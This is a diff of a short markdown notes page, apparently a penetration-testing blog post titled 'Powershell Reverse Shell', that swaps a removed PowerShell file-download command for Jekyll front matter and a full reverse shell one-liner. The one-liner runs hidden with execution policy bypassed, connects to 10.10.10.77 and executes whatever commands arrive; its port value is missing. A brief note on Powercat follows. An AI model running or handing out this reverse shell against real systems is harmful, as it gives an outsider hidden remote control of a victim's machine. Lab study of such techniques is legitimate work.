@@ -1,17 +1,18 @@
-### Transfer Files
-```powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
-```
+---
+description: >-
+  Powershell Reverse Shell
+title:  Powershell Reverse Shell             # Add title here
+date: 2022-08-30 08:00:00 -0600                           # Change the date to match completion date
+categories: [07 Persistence, Powershell Reverse Shell]                     # Change Templates to Writeup
+tags: [persistence, powershell, reverse shell]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
 
 ### Reverse Shell
-![[Pasted image 20220830193023.png]]
-Resource:
-https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
-
-### Bind Shell
-![[Pasted image 20220830194523.png]]
-Resource
-https://gitbook.brainyou.stream/reverse-shells
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.77",);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 
 ### Powercat
 It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells
